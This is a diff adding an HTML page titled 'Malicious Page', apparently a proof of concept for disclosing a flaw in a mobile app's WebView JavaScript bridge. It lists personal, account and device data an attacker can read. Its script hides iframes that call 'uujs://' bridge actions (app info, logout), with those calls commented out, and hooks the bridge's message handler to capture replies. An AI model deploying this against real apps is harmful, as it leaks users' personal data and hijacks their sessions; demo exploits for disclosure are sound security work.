@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" charset="UTF-8">
+    <style>
+        body {
+            margin: 0;
+            font-family: Arial, Helvetica, sans-serif;
+        }
+
+        .container {
+            width: 100%;
+            padding: 15px;
+        }
+
+        @media screen and (min-width: 700px) {
+            .container {
+                width: 70%;
+                margin: auto;
+            }
+        }
+
+        p {
+            white-space: pre-wrap; 
+            word-wrap: break-word; 
+            overflow-wrap: break-word; 
+        }
+
+        .bold-and-larger {
+            font-weight: bold; 
+            font-size: 1.5em; 
+        }
+
+        .larger {
+            font-weight: bold; 
+            font-size: 1.2em; 
+        }
+
+    </style>
+    <title>Malicious Page</title>
+
+</head>
+
+
+<body>
+    <h1>Malicious Page</h1>
+
+    <p>!!! This is just a demo page, NO Sensitive Data will be stored!!!</p>
+
+    <p><span class="bold-and-larger">An attacker can:</span></p>
+
+    <p><span class="larger">Get Your Personal Info:</span></p>
+    <p style="font-size: 15px;" id="PhoneNumber"></p>
+    <p style="font-size: 15px;" id="CountryCode"></p>
+
+    <p><span class="larger">Get Your Account Info:</span></p>
+    <p style="font-size: 15px;" id="NickName"></p>
+    <p style="font-size: 15px;" id="UserID"></p>
+    <p style="font-size: 15px;" id="AccountAvatarText">Your Avatar: </p>
+    <div class="image-with-text">
+        <img id="AccountAvatar" src="" alt="" width="30%" height="auto">
+    </div>
+
+    <p><span class="larger">Get Your Device Info:</span></p>
+    <p style="font-size: 15px;" id="DeviceID"></p>
+
+    <p><span class="larger">Log Out Your Account:</span></p>
+    <input type="button" value="Log Out" id="LogOut" style="font-size: 20px; padding: 20px 25px;"/>
+
+    <br>
+
+    <script>
+
+    function fetchData(url) {
+        var iframe = document.createElement("iframe");
+        iframe.style.cssText = "display:none;width:0px;height:0px;";
+        iframe.src = url;
+        document.body.appendChild(iframe);
+    }
+
+    window.WVJSProxy.didReceiveMessage = function(res){
+        console.log("[attacker]: " + res);
+    }
+
+    // setTimeout(function() {
+    //     fetchData('uujs://get_app_info?data={"callback":"callback_get_app_info","callback_id":"noMatterWhat"}');
+    // }, 1000);
+
+    // document.getElementById("LogOut").onclick = function () {
+    //     fetchData('uujs://logout?data={"callback":"callback_logout","callback_id":"noMatterWhat"}');
+    // }
+
+    </script>
+
+</body>
+
+</html>
